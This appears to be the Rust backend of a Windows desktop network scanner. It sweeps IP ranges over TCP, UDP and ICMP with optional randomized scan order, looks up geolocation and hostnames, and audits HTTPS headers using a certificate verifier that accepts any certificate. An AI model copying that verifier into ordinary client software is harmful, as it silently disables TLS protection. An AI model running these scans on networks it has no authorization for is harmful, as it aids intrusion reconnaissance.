// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::str::FromStr;
use std::collections::HashMap;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc, Mutex,
};
use std::time::{Duration, Instant, SystemTime};

use serde::{Deserialize, Serialize};
use rusqlite::{Connection, params};
// Agent Profile attachment BLOBs cross the Tauri IPC boundary as base64
// (serde_json has no native binary encoding) - decoded/encoded only at the
// SQLite bind-parameter step, same reasoning as the JS-side codec.
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use base64::Engine as _;
use tauri::{AppHandle, Emitter, Manager, WebviewWindow};
use tokio::net::{TcpListener, TcpStream};
use tokio::time::timeout;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::tungstenite::Message;
use lettre::AsyncTransport;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

// ICMP echo via the IP Helper API (iphlpapi.dll) - unlike raw ICMP sockets,
// this does NOT require Administrator privileges (it's the same mechanism
// ping.exe itself uses), so it's used instead of a raw-socket crate.
use windows::Win32::NetworkManagement::IpHelper::{
    IcmpCloseHandle, IcmpCreateFile, IcmpSendEcho, ICMP_ECHO_REPLY,
};

// Network Monitor: local TCP/UDP connections + ARP table, all standard
// unprivileged IP Helper API calls (the same mechanism netstat/arp -a use
// internally) - no admin needed, same philosophy as the ICMP work above.
use windows::Win32::NetworkManagement::IpHelper::{
    FreeMibTable, GetExtendedTcpTable, GetExtendedUdpTable, GetIpNetTable2,
    MIB_IPNET_TABLE2, MIB_TCPTABLE_OWNER_PID,
    MIB_TCP_STATE_CLOSE_WAIT, MIB_TCP_STATE_CLOSED, MIB_TCP_STATE_CLOSING,
    MIB_TCP_STATE_DELETE_TCB, MIB_TCP_STATE_ESTAB, MIB_TCP_STATE_FIN_WAIT1,
    MIB_TCP_STATE_FIN_WAIT2, MIB_TCP_STATE_LAST_ACK, MIB_TCP_STATE_LISTEN,
    MIB_TCP_STATE_SYN_RCVD, MIB_TCP_STATE_SYN_SENT, MIB_TCP_STATE_TIME_WAIT,
    MIB_UDPTABLE_OWNER_PID, TCP_TABLE_OWNER_PID_ALL,
    UDP_TABLE_OWNER_PID,
};
use windows::Win32::Networking::WinSock::AF_INET;
use windows::Win32::System::Threading::{
    OpenProcess, QueryFullProcessImageNameW, PROCESS_NAME_WIN32,
    PROCESS_QUERY_LIMITED_INFORMATION,
};
use windows::Win32::Foundation::{CloseHandle, ERROR_INSUFFICIENT_BUFFER};

// ─── Shared scan-stop flag ───────────────────────────────────────────────────
struct ScanState {
    stop: AtomicBool,
}

// ─── DTOs ────────────────────────────────────────────────────────────────────
#[derive(Serialize, Clone)]
struct PortLatency {
    port: u16,
    ms: Option<u64>,
    protocol: String,
    // "open" (confirmed) or "open_filtered" (UDP-only: no response at all,
    // which for UDP can mean either open or silently firewalled - there's
    // no way to tell those apart, same limitation every UDP scanner has).
    status: String,
}

#[derive(Serialize, Clone)]
struct HostFound {
    ip: String,
    open_ports: Vec<PortLatency>,
    ping_ms: Option<u64>,
}

#[derive(Serialize, Clone)]
struct ScanProgress {
    total: u32,
    processed: u32,
    found: u32,
    done: bool,
    stopped: bool,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct GeoResult {
    pub status: String,
    pub country: Option<String>,
    #[serde(rename = "countryCode", alias = "country_code")]
    pub country_code: Option<String>,
    pub city: Option<String>,
    pub isp: Option<String>,
    pub org: Option<String>,
    #[serde(rename = "as")]
    pub as_info: Option<String>,
    pub proxy: Option<bool>,
    pub hosting: Option<bool>,
    pub lat: Option<f64>,
    pub lon: Option<f64>,
}

#[derive(Deserialize)]
struct IpWhoIsConnection {
    isp: Option<String>,
    org: Option<String>,
    asn: Option<u32>,
}

#[derive(Deserialize)]
struct IpWhoIsResult {
    success: bool,
    country: Option<String>,
    country_code: Option<String>,
    city: Option<String>,
    latitude: Option<f64>,
    longitude: Option<f64>,
    connection: Option<IpWhoIsConnection>,
}

#[derive(Deserialize)]
struct HostnameResult {
    status: String,
    reverse: Option<String>,
}

#[derive(Serialize, Clone)]
struct PowerShellExecResult {
    stdout: String,
    stderr: String,
    exit_code: i32,
}

fn resolve_scripts_base_dir(app: &AppHandle) -> Option<PathBuf> {
    use std::io::Write;
    
    fn log_debug(msg: &str) {
        eprintln!("{}", msg);
        if let Ok(appdata) = std::env::var("APPDATA") {
            let log_file = Path::new(&appdata).join("debug_ipscanner.log");
            if let Ok(mut file) = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&log_file)
            {
                let _ = writeln!(file, "{}", msg);
            }
        }
    }
    
    fn find_scripts_dir(base: &Path) -> Option<PathBuf> {
        let direct = base.join("scripts");
        if direct.is_dir() {
            log_debug(&format!("[DEBUG] Found scripts at: {}", direct.display()));
            return Some(base.to_path_buf());
        }

        let up_path = base.join("_up_").join("scripts");
        if up_path.is_dir() {
            log_debug(&format!("[DEBUG] Found _up_/scripts at: {}", up_path.display()));
            return Some(base.join("_up_"));
        }

        None
    }

    log_debug("[DEBUG] Starting scripts base directory resolution");

    if let Ok(cwd) = std::env::current_dir() {
        log_debug(&format!("[DEBUG] Checking cwd: {}", cwd.display()));
        if let Some(dir) = find_scripts_dir(&cwd) {
            log_debug("[DEBUG] Found scripts in cwd");
            return Some(dir);
        }
    }

    if let Ok(resource_dir) = app.path().resource_dir() {
        log_debug(&format!("[DEBUG] Checking resource_dir: {}", resource_dir.display()));
        if let Some(dir) = find_scripts_dir(&resource_dir) {
            log_debug("[DEBUG] Found scripts in resource_dir");
            return Some(dir);
        }
        if let Some(parent) = resource_dir.parent() {
            log_debug(&format!("[DEBUG] Checking resource_dir parent: {}", parent.display()));
            if let Some(dir) = find_scripts_dir(parent) {
                log_debug("[DEBUG] Found scripts in resource_dir parent");
                return Some(dir);
            }
        }
    }

    if let Ok(exe_path) = std::env::current_exe() {
        log_debug(&format!("[DEBUG] Checking from exe path: {}", exe_path.display()));
        let mut cursor = exe_path.parent().map(|p| p.to_path_buf());
        for i in 0..6 {
            if let Some(dir) = cursor.clone() {
                log_debug(&format!("[DEBUG] Checking exe parent level {}: {}", i, dir.display()));
                if let Some(found) = find_scripts_dir(&dir) {
                    log_debug(&format!("[DEBUG] Found scripts at exe parent level {}", i));
                    return Some(found);
                }
                cursor = dir.parent().map(|p| p.to_path_buf());
            } else {
                break;
            }
        }
    }

    log_debug("[DEBUG] Failed to resolve scripts base directory");
    None
}

// ─── Commands ────────────────────────────────────────────────────────────────

/// Dependency-free Fisher-Yates shuffle (splitmix64 PRNG seeded from the
/// current time) - used by the Config tab's "Randomize ports"/"Randomize
/// hosts" options. Not cryptographic, just needs to look shuffled enough to
/// avoid an always-sequential scan pattern.
fn shuffle_vec<T>(v: &mut Vec<T>) {
    let mut seed = SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x2545F4914F6CDD1D);
    let mut next_rand = || {
        seed = seed.wrapping_add(0x9E3779B97F4A7C15);
        let mut z = seed;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58476D1CE4E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D049BB133111EB);
        z ^ (z >> 31)
    };
    let len = v.len();
    for i in (1..len).rev() {
        let j = (next_rand() as usize) % (i + 1);
        v.swap(i, j);
    }
}

/// A bare IPv4 literal never contains ':' (that's reserved for IPv6's own
/// group separator) - cheap enough to call per-probe without a real parse.
fn is_ipv6_literal(ip: &str) -> bool {
    ip.contains(':')
}

/// Parses "ip" or "ip%zone" into an IpAddr plus a numeric scope id (0 for
/// anything without a zone, or for IPv4). Windows link-local IPv6
/// addresses (fe80::/10) are only meaningful per network interface, and
/// Windows always writes/expects them with a "%<interface-index>" zone
/// suffix (see ipconfig's own output, or what a user copy-pastes off their
/// own machine) - std's IpAddr/SocketAddr FromStr has no support at all
/// for this syntax, so a scoped address would otherwise fail to parse
/// silently and just never get scanned. The zone is always numeric here
/// (Windows' own convention for this address family), so a plain u32
/// parse is enough - no textual adapter names (Unix's "%eth0" form) to
/// handle on this platform.
fn resolve_ip_addr(ip: &str) -> Option<(IpAddr, u32)> {
    match ip.split_once('%') {
        Some((base, zone)) => {
            let v6: Ipv6Addr = base.parse().ok()?;
            let scope: u32 = zone.parse().ok()?;
            Some((IpAddr::V6(v6), scope))
        }
        None => Some((ip.parse().ok()?, 0)),
    }
}

/// Builds a real SocketAddr directly (never through string parsing, which
/// has no way to carry a scope id at all) - see resolve_ip_addr above.
fn resolve_socket_addr(ip: &str, port: u16) -> Option<SocketAddr> {
    let (addr, scope) = resolve_ip_addr(ip)?;
    Some(match addr {
        IpAddr::V4(v4) => SocketAddr::V4(std::net::SocketAddrV4::new(v4, port)),
        IpAddr::V6(v6) => SocketAddr::V6(std::net::SocketAddrV6::new(v6, port, 0, scope)),
    })
}

/// Probes one UDP port via a *connected* socket - on Windows, an incoming
/// ICMP "port unreachable" surfaces as a ConnectionReset error on recv, so
/// this needs no raw socket / admin rights, unlike a classic UDP scanner.
/// Returns (round_trip_ms, confirmed): confirmed=true only when real reply
/// data came back (definitely open); confirmed=false means no response at
/// all within the timeout - UDP's inherent "open|filtered" ambiguity, not
/// something this can resolve further. None means a ConnectionReset came
/// back - the port is definitely closed, not reported at all (same as TCP).
async fn probe_port_udp(ip: &str, port: u16, timeout_ms: u64) -> Option<(u64, bool)> {
    let addr = resolve_socket_addr(ip, port)?;
    let bind_addr = if is_ipv6_literal(ip) { "[::]:0" } else { "0.0.0.0:0" };
    let socket = tokio::net::UdpSocket::bind(bind_addr).await.ok()?;
    socket.connect(addr).await.ok()?;
    let _ = socket.send(&[]).await;

    let t0 = Instant::now();
    let mut buf = [0u8; 512];
    match timeout(Duration::from_millis(timeout_ms), socket.recv(&mut buf)).await {
        Ok(Ok(_n)) => Some((t0.elapsed().as_millis() as u64, true)),
        Ok(Err(e)) if e.kind() == std::io::ErrorKind::ConnectionReset => None,
        Ok(Err(_)) => Some((t0.elapsed().as_millis() as u64, false)),
        Err(_) => Some((t0.elapsed().as_millis() as u64, false)),
    }
}

/// Probe a single IP across all given ports; returns open ports + best latency.
async fn probe_host(
    ip: String,
    mut ports: Vec<u16>,
    timeout_ms: u64,
    retries: u32,
    scan_delay_ms: u64,
    max_concurrent_ports: usize,
    randomize_ports: bool,
    tcp_checked: bool,
    udp_checked: bool,
) -> (Vec<PortLatency>, Option<u64>) {
    if randomize_ports {
        shuffle_vec(&mut ports);
    }
    let port_sem = Arc::new(tokio::sync::Semaphore::new(max_concurrent_ports.max(1)));
    let mut set: tokio::task::JoinSet<Option<PortLatency>> = tokio::task::JoinSet::new();
    for port in ports {
        if tcp_checked {
            let ip_c = ip.clone();
            let permit = port_sem.clone().acquire_owned().await.unwrap();
            set.spawn(async move {
                let _permit = permit;
                let addr: SocketAddr = match resolve_socket_addr(&ip_c, port) {
                    Some(a) => a,
                    None => return None,
                };
                if scan_delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(scan_delay_ms)).await;
                }
                let t0 = Instant::now();
                let attempts = retries.saturating_add(1);
                for attempt in 0..attempts {
                    match timeout(Duration::from_millis(timeout_ms), TcpStream::connect(addr)).await {
                        Ok(Ok(_)) => {
                            return Some(PortLatency {
                                port,
                                ms: Some(t0.elapsed().as_millis() as u64),
                                protocol: "TCP".into(),
                                status: "open".into(),
                            })
                        }
                        _ => {
                            if attempt + 1 == attempts {
                                return None;
                            }
                        }
                    }
                }
                None
            });
        }

        if udp_checked {
            let ip_u = ip.clone();
            let permit_u = port_sem.clone().acquire_owned().await.unwrap();
            set.spawn(async move {
                let _permit = permit_u;
                if scan_delay_ms > 0 {
                    tokio::time::sleep(Duration::from_millis(scan_delay_ms)).await;
                }
                match probe_port_udp(&ip_u, port, timeout_ms).await {
                    Some((ms, true)) => Some(PortLatency {
                        port,
                        ms: Some(ms),
                        protocol: "UDP".into(),
                        status: "open".into(),
                    }),
                    Some((ms, false)) => Some(PortLatency {
                        port,
                        ms: Some(ms),
                        protocol: "UDP".into(),
                        status: "open_filtered".into(),
                    }),
                    None => None,
                }
            });
        }
    }
    let mut open_ports: Vec<PortLatency> = Vec::new();
    let mut best_ms: Option<u64> = None;
    while let Some(res) = set.join_next().await {
        if let Ok(Some(entry)) = res {
            if let Some(m) = entry.ms {
                best_ms = Some(best_ms.map_or(m, |prev: u64| prev.min(m)));
            }
            open_ports.push(entry);
        }
    }
    open_ports.sort_unstable_by_key(|p| p.port);
    (open_ports, best_ms)
}

/// Sends one ICMP echo request via IcmpSendEcho and returns the round-trip
/// time in ms on success. Synchronous/blocking Win32 call - must only be
/// invoked from inside spawn_blocking, never directly on an async task.
fn icmp_ping_blocking(ip: &str, timeout_ms: u32) -> Option<u64> {
    let addr = Ipv4Addr::from_str(ip).ok()?;
    // IcmpSendEcho's destinationaddress is a raw copy of IN_ADDR's bytes,
    // not the "logical" big-endian numeric value ip_to_u32()/ std's
    // u32::from(Ipv4Addr) produce - from_ne_bytes keeps the octets as-is.
    let dest = u32::from_ne_bytes(addr.octets());

    unsafe {
        let handle = IcmpCreateFile().ok()?;
        let send_data = [0u8; 32];
        let reply_size = std::mem::size_of::<ICMP_ECHO_REPLY>() + send_data.len() + 8;
        let mut reply_buffer = vec![0u8; reply_size];

        let start = Instant::now();
        let replies = IcmpSendEcho(
            handle,
            dest,
            send_data.as_ptr() as *const core::ffi::c_void,
            send_data.len() as u16,
            None,
            reply_buffer.as_mut_ptr() as *mut core::ffi::c_void,
            reply_buffer.len() as u32,
            timeout_ms,
        );
        let elapsed_ms = start.elapsed().as_millis() as u64;

        let _ = IcmpCloseHandle(handle);

        if replies == 0 {
            return None;
        }

        let reply = &*(reply_buffer.as_ptr() as *const ICMP_ECHO_REPLY);
        if reply.Status != 0 {
            // Non-zero Status = an IP_STATUS error (e.g. destination
            // unreachable, TTL expired) - not a successful echo.
            return None;
        }
        Some(if reply.RoundTripTime > 0 { reply.RoundTripTime as u64 } else { elapsed_ms })
    }
}

/// ICMP counterpart to probe_host() - same signature shape (a port list and
/// a best round-trip time) so probe_host_multi (below) doesn't need to
/// branch on return shape, only on which function to call. Always returns
/// an empty port list.
async fn probe_host_icmp(ip: String, timeout_ms: u64, retries: u32) -> (Vec<PortLatency>, Option<u64>) {
    let attempts = retries.saturating_add(1);
    let timeout_u32 = u32::try_from(timeout_ms).unwrap_or(u32::MAX);
    for _ in 0..attempts {
        let ip_c = ip.clone();
        let result = tokio::task::spawn_blocking(move || icmp_ping_blocking(&ip_c, timeout_u32))
            .await
            .unwrap_or(None);
        if result.is_some() {
            return (Vec::new(), result);
        }
    }
    (Vec::new(), None)
}

/// Combines TCP/UDP port probing (probe_host) with an ICMP ping
/// (probe_host_icmp), run concurrently - protocols are independently
/// switchable now (see Config's Protocol section), not an exclusive
/// either/or mode. Returns (open_ports, ping_ms, icmp_replied):
/// ping_ms prefers the real ICMP round-trip when icmp_checked succeeded,
/// falling back to probe_host's TCP-connect-latency proxy otherwise;
/// icmp_replied is surfaced separately so the caller can treat "ICMP
/// answered but no ports open" as a found host too.
async fn probe_host_multi(
    ip: String,
    ports: Vec<u16>,
    timeout_ms: u64,
    retries: u32,
    scan_delay_ms: u64,
    max_concurrent_ports: usize,
    randomize_ports: bool,
    tcp_checked: bool,
    udp_checked: bool,
    icmp_checked: bool,
) -> (Vec<PortLatency>, Option<u64>, bool) {
    let icmp_fut = async {
        if icmp_checked {
            probe_host_icmp(ip.clone(), timeout_ms, retries).await.1
        } else {
            None
        }
    };
    let ports_fut = async {
        if tcp_checked || udp_checked {
            probe_host(
                ip.clone(),
                ports,
                timeout_ms,
                retries,
                scan_delay_ms,
                max_concurrent_ports,
                randomize_ports,
                tcp_checked,
                udp_checked,
            )
            .await
        } else {
            (Vec::new(), None)
        }
    };
    let (icmp_ms, (open_ports, port_ms)) = tokio::join!(icmp_fut, ports_fut);
    let icmp_replied = icmp_ms.is_some();
    let ping_ms = icmp_ms.or(port_ms);
    (open_ports, ping_ms, icmp_replied)
}

/// Scan an IP range. Emits "host-found" events for each responsive host.
#[tauri::command]
async fn scan_range(
    app: AppHandle,
    from_ip: String,
    to_ip: String,
    ports: Vec<u16>,
    concurrency: usize,
    timeout_ms: u64,
    retries: u32,
    scan_delay_ms: u64,
    max_concurrent_ports: usize,
    randomize_ports: bool,
    randomize_hosts: bool,
    tcp_checked: bool,
    udp_checked: bool,
    icmp_checked: bool,
) -> Result<u32, String> {
    let start = ip_to_u32(&from_ip).map_err(|e| e.to_string())?;
    let end   = ip_to_u32(&to_ip).map_err(|e| e.to_string())?;
    if start > end {
        return Err("start IP is greater than end IP".into());
    }

    // Reset stop flag
    app.state::<Arc<ScanState>>().stop.store(false, Ordering::Relaxed);

    let sem  = Arc::new(tokio::sync::Semaphore::new(concurrency.max(1).min(256)));
    let stop = app.state::<Arc<ScanState>>().inner().clone();
    let total = end - start + 1;
    let mut set: tokio::task::JoinSet<bool> = tokio::task::JoinSet::new();

    let _ = app.emit("scan-progress", ScanProgress {
        total,
        processed: 0,
        found: 0,
        done: false,
        stopped: false,
    });

    let mut offsets: Vec<u32> = (0..total).collect();
    if randomize_hosts {
        shuffle_vec(&mut offsets);
    }

    for i in offsets {
        if stop.stop.load(Ordering::Relaxed) { break; }
        let ip      = u32_to_ip(start + i);
        let ports_c = ports.clone();
        let app_c   = app.clone();
        let permit  = sem.clone().acquire_owned().await.unwrap();
        let stop_c  = stop.clone();

        set.spawn(async move {
            let _permit = permit;
            if stop_c.stop.load(Ordering::Relaxed) {
                return false;
            }
            let (open_ports, ping_ms, icmp_replied) = probe_host_multi(
                ip.clone(),
                ports_c,
                timeout_ms,
                retries,
                scan_delay_ms,
                max_concurrent_ports,
                randomize_ports,
                tcp_checked,
                udp_checked,
                icmp_checked,
            ).await;
            // A host counts as found only on a CONFIRMED signal - a
            // definitely-open port (TCP, or UDP with a real reply) or a
            // real ICMP echo reply. open_filtered UDP entries alone must
            // NOT count: on a real network, most routers/firewalls simply
            // drop unsolicited UDP instead of sending back an ICMP
            // unreachable, so a UDP scan's timeout case is common, not
            // rare - counting it as "found" on its own would report almost
            // every address in a swept range as a live host. Once a host
            // IS confirmed via another signal, its open_filtered entries
            // still ride along in open_ports as legitimate bonus info.
            let found = open_ports.iter().any(|p| p.status == "open") || icmp_replied;
            if found {
                let _ = app_c.emit("host-found", HostFound { ip, open_ports, ping_ms });
                true
            } else {
                false
            }
        });
    }

    let mut found = 0u32;
    let mut processed = 0u32;
    let mut last_progress_emit = std::time::Instant::now();
    while let Some(res) = set.join_next().await {
        processed += 1;
        if matches!(res, Ok(true)) { found += 1; }
        // One IPC event per completed host means a wide range (e.g. a /16,
        // 65k hosts) dispatches tens of thousands of events the UI only
        // ever needs a handful of visual updates per second from -
        // throttle to roughly 10/sec; the final "done: true" event below
        // always fires afterward with the complete, accurate count
        // regardless of how the in-progress updates were coalesced.
        if last_progress_emit.elapsed() >= std::time::Duration::from_millis(100) {
            last_progress_emit = std::time::Instant::now();
            let _ = app.emit("scan-progress", ScanProgress {
                total,
                processed,
                found,
                done: false,
                stopped: false,
            });
        }
    }

    let stopped = stop.stop.load(Ordering::Relaxed);
    let _ = app.emit("scan-progress", ScanProgress {
        total,
        processed,
        found,
        done: true,
        stopped,
    });

    Ok(found)
}

/// Scan an explicit, possibly non-contiguous list of IP addresses (the
/// sidebar's "Memory" mode - a hand-typed/pasted notepad instead of a
/// Range/CIDR sweep - and "IPv6" mode, a hand-picked IPv6 address list for
/// the same reason: an IPv6 subnet is far too large to brute-force the way
/// IPv4 CIDR mode does). Shares scan_range's probing/progress/stop
/// machinery; the only real difference is how the host list is produced.
/// ICMP is silently skipped per-host for any IPv6 address, not an error -
/// icmp_ping_blocking only implements ICMPv4 (IcmpSendEcho); ICMPv6 needs a
/// genuinely different WinAPI call (Icmp6SendEcho2), not yet implemented.
#[tauri::command]
async fn scan_hosts(
    app: AppHandle,
    ips: Vec<String>,
    ports: Vec<u16>,
    concurrency: usize,
    timeout_ms: u64,
    retries: u32,
    scan_delay_ms: u64,
    max_concurrent_ports: usize,
    randomize_ports: bool,
    randomize_hosts: bool,
    tcp_checked: bool,
    udp_checked: bool,
    icmp_checked: bool,
) -> Result<u32, String> {
    // Defense in depth - the frontend already filters to valid IPv4/IPv6
    // before sending, but this list comes from free-typed text, so don't
    // trust it blindly. resolve_ip_addr (not a plain IpAddr::from_str)
    // because it also accepts a Windows IPv6 zone id ("fe80::1%9") - a
    // link-local address without one would still parse as a bare
    // Ipv6Addr, but connecting to it would go out whichever interface the
    // OS guesses instead of the one actually intended.
    let mut hosts: Vec<String> = ips.into_iter()
        .filter(|ip| resolve_ip_addr(ip).is_some())
        .collect();
    if randomize_hosts {
        shuffle_vec(&mut hosts);
    }

    // Reset stop flag
    app.state::<Arc<ScanState>>().stop.store(false, Ordering::Relaxed);

    let sem  = Arc::new(tokio::sync::Semaphore::new(concurrency.max(1).min(256)));
    let stop = app.state::<Arc<ScanState>>().inner().clone();
    let total = hosts.len() as u32;
    let mut set: tokio::task::JoinSet<bool> = tokio::task::JoinSet::new();

    let _ = app.emit("scan-progress", ScanProgress {
        total,
        processed: 0,
        found: 0,
        done: false,
        stopped: false,
    });

    for ip in hosts {
        if stop.stop.load(Ordering::Relaxed) { break; }
        let ports_c = ports.clone();
        let app_c   = app.clone();
        let permit  = sem.clone().acquire_owned().await.unwrap();
        let stop_c  = stop.clone();

        set.spawn(async move {
            let _permit = permit;
            if stop_c.stop.load(Ordering::Relaxed) {
                return false;
            }
            let (open_ports, ping_ms, icmp_replied) = probe_host_multi(
                ip.clone(),
                ports_c,
                timeout_ms,
                retries,
                scan_delay_ms,
                max_concurrent_ports,
                randomize_ports,
                tcp_checked,
                udp_checked,
                icmp_checked,
            ).await;
            // Same confirmed-signal rule as scan_range - see its comment.
            let found = open_ports.iter().any(|p| p.status == "open") || icmp_replied;
            if found {
                let _ = app_c.emit("host-found", HostFound { ip, open_ports, ping_ms });
                true
            } else {
                false
            }
        });
    }

    let mut found = 0u32;
    let mut processed = 0u32;
    let mut last_progress_emit = std::time::Instant::now();
    while let Some(res) = set.join_next().await {
        processed += 1;
        if matches!(res, Ok(true)) { found += 1; }
        if last_progress_emit.elapsed() >= std::time::Duration::from_millis(100) {
            last_progress_emit = std::time::Instant::now();
            let _ = app.emit("scan-progress", ScanProgress {
                total,
                processed,
                found,
                done: false,
                stopped: false,
            });
        }
    }

    let stopped = stop.stop.load(Ordering::Relaxed);
    let _ = app.emit("scan-progress", ScanProgress {
        total,
        processed,
        found,
        done: true,
        stopped,
    });

    Ok(found)
}

/// Stop a running scan_range.
#[tauri::command]
fn stop_scan(app: AppHandle) {
    app.state::<Arc<ScanState>>().stop.store(true, Ordering::Relaxed);
}

/// Geolocation via ip-api.com (no CORS constraints from Rust).
#[tauri::command]
async fn geo_lookup(ip: String) -> Option<GeoResult> {
    let http_url = format!(
        "http://ip-api.com/json/{}?fields=status,country,countryCode,city,isp,org,proxy,hosting,as,lat,lon",
        ip
    );
    let https_url = format!(
        "https://ip-api.com/json/{}?fields=status,country,countryCode,city,isp,org,proxy,hosting,as,lat,lon",
        ip
    );
    let ipwhois_url = format!("https://ipwho.is/{}", ip);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .ok()?;

    // Free ip-api endpoint is HTTP-first (HTTPS may be unavailable without paid plan).
    if let Ok(resp) = client.get(&http_url).send().await {
        if let Ok(geo) = resp.json::<GeoResult>().await {
            if geo.status == "success" {
                return Some(geo);
            }
        }
    }

    // Keep HTTPS as secondary fallback for environments where it is available.
    if let Ok(resp) = client.get(&https_url).send().await {
        if let Ok(geo) = resp.json::<GeoResult>().await {
            if geo.status == "success" {
                return Some(geo);
            }
        }
    }

    // Fallback provider for better resilience when ip-api is unavailable/rate-limited.
    if let Ok(resp) = client.get(&ipwhois_url).send().await {
        if let Ok(geo) = resp.json::<IpWhoIsResult>().await {
            if geo.success {
                let conn = geo.connection;
                let as_info = conn
                    .as_ref()
                    .and_then(|c| c.asn)
                    .map(|asn| format!("AS{}", asn));
                return Some(GeoResult {
                    status: "success".to_string(),
                    country: geo.country,
                    country_code: geo.country_code,
                    city: geo.city,
                    isp: conn.as_ref().and_then(|c| c.isp.clone()),
                    org: conn.as_ref().and_then(|c| c.org.clone()),
                    as_info,
                    proxy: None,
                    hosting: None,
                    lat: geo.latitude,
                    lon: geo.longitude,
                });
            }
        }
    }

    None
}

#[tauri::command]
async fn hostname_lookup(ip: String) -> Option<String> {
    let ip_addr: std::net::IpAddr = ip.parse().ok()?;

    // For private/local IPs use system reverse DNS (PTR record via OS resolver)
    let is_private = match ip_addr {
        std::net::IpAddr::V4(v4) => {
            let o = v4.octets();
            o[0] == 10
                || (o[0] == 172 && (16..=31).contains(&o[1]))
                || (o[0] == 192 && o[1] == 168)
                || o[0] == 127
                || (o[0] == 169 && o[1] == 254)
        }
        _ => false,
    };

    if is_private {
        let ip_str = ip.clone();
        let lookup = tokio::task::spawn_blocking(move || {
            let hostname = dns_lookup::lookup_addr(&ip_addr).ok()?;
            // Some resolvers return the bare IP when there is no PTR record
            if hostname.trim_end_matches('.') == ip_str {
                None
            } else {
                Some(hostname)
            }
        });
        return match tokio::time::timeout(std::time::Duration::from_secs(3), lookup).await {
            Ok(Ok(result)) => result,
            _ => None,
        };
    }

    // Public IP: use ip-api.com reverse field
    let https_url = format!("https://ip-api.com/json/{}?fields=status,reverse", ip);
    let http_url = format!("http://ip-api.com/json/{}?fields=status,reverse", ip);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .ok()?;

    if let Ok(resp) = client.get(&https_url).send().await {
        if let Ok(host) = resp.json::<HostnameResult>().await {
            if host.status == "success" {
                return host.reverse.and_then(|v| {
                    let trimmed = v.trim().to_string();
                    if trimmed.is_empty() { None } else { Some(trimmed) }
                });
            }
        }
    }

    if let Ok(resp) = client.get(&http_url).send().await {
        if let Ok(host) = resp.json::<HostnameResult>().await {
            if host.status == "success" {
                return host.reverse.and_then(|v| {
                    let trimmed = v.trim().to_string();
                    if trimmed.is_empty() { None } else { Some(trimmed) }
                });
            }
        }
    }

    None
}

// ─── HTTPS Auditor (security-header / MITM-exposure check for one URL) ───────

// Real HTTP requests from Rust, not the webview's own fetch() - the whole
// point is reading response headers/redirect chains for ANY target domain,
// which a browser's CORS rules would block for anything cross-origin. See
// js/new-ui/core/runtimes/https-auditor-runtime.js for the caller.
#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct RedirectHop {
    url: String,
    status: u16,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct HttpsAuditResult {
    requested_url: String,
    final_url: String,
    final_status: u16,
    redirect_chain: Vec<RedirectHop>,
    http_upgrades_to_https: bool,
    hsts: Option<String>,
    hsts_preloaded: bool,
    csp: Option<String>,
    x_frame_options: Option<String>,
    x_content_type_options: Option<String>,
    referrer_policy: Option<String>,
    server: Option<String>,
    mixed_content_count: u32,
    mixed_content_examples: Vec<String>,
    cert: Option<CertInfo>,
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct CertInfo {
    subject: String,
    issuer: String,
    not_before: String,
    not_after: String,
    days_until_expiry: i64,
    expired: bool,
}

// Accepts any certificate presented, valid or not - this is inspecting
// what the server hands over, not making a trust decision (that's what
// the rest of the audit's HSTS/header checks already do). Without this, a
// self-signed or expired cert would abort the handshake before we ever
// got to read it, which is exactly the case most worth surfacing.
#[derive(Debug)]
struct AcceptAnyCert;

impl rustls::client::danger::ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls_pki_types::CertificateDer<'_>,
        _intermediates: &[rustls_pki_types::CertificateDer<'_>],
        _server_name: &rustls_pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls_pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls_pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls_pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        // Never actually rejects based on scheme (both signature-verify
        // methods above accept unconditionally) - this just needs to list
        // enough schemes for the handshake to pick one and proceed.
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

